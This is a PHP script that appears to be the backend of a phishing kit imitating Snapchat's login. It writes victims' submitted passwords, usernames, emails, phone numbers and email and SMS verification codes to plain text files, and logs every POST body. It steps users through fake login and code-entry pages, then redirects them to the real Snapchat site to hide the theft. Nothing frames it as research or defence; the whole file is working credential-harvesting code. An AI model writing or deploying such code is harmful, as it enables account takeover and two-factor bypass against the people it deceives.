<?php
file_put_contents("php.log", print_r($_POST, true) . "\n", FILE_APPEND);
error_log('POST DATA: ' . print_r($_POST, true));




// pull values from the form safely
$password       = $_POST['password']        ?? '';
$username       = $_POST['username']        ?? '';
$email       = $_POST['email']        ?? '';
$phone       = $_POST['phone']        ?? '';
$email_code  = $_POST['email code']   ?? '';
$sms_code    = $_POST['sms code']     ?? '';



// write password
if (!empty($password)) {
    file_put_contents(__DIR__ . "/password.txt",
        "password: " . $password . "\n",
        FILE_APPEND
    );
}



// write username
if (!empty($username)) {
    file_put_contents(__DIR__ . "/username.txt",
        "Username: " . $username . "\n",
        FILE_APPEND
    );
}


// write email
if (!empty($email)) {
    file_put_contents(__DIR__ . "/emails.txt",
        "Email: " . $email . "\n",
        FILE_APPEND
    );
}

// write phone
if (!empty($phone)) {
    file_put_contents(__DIR__ . "/phones.txt",
        "Phone: " . $phone . "\n",
        FILE_APPEND
    );
}

// write email code
if (!empty($email_code)) {
    file_put_contents(__DIR__ . "/email_codes.txt",
        "Email Code: " . $email_code . "\n",
        FILE_APPEND
    );
}

// write sms code + redirect
if (!empty($sms_code)) {
    file_put_contents(__DIR__ . "/sms_codes.txt",
        "SMS Code: " . $sms_code . "\n",
        FILE_APPEND
    );
}

// redirects
if (!empty($username) || !empty($password)) {
    // came from Login.html -> go to phone page
    header('Location: Enter_sms_code.html');
} elseif (!empty($phone)) {
    // Enter_Phone_Number.html -> SMS page
    header('Location: Enter_sms_code.html');
} elseif (!empty($email)) {
    // Enter_email.html -> email code page
    header('Location: Enter_Email_Code.html');
} elseif (!empty($email_code) || !empty($sms_code)) {
    // after codes -> Snapchat
    header('Location:
 https://www.snapchat.com');
} else {
    // fallback if no fields are filled
    header('Location: Login.html');
    exit;
}
exit;

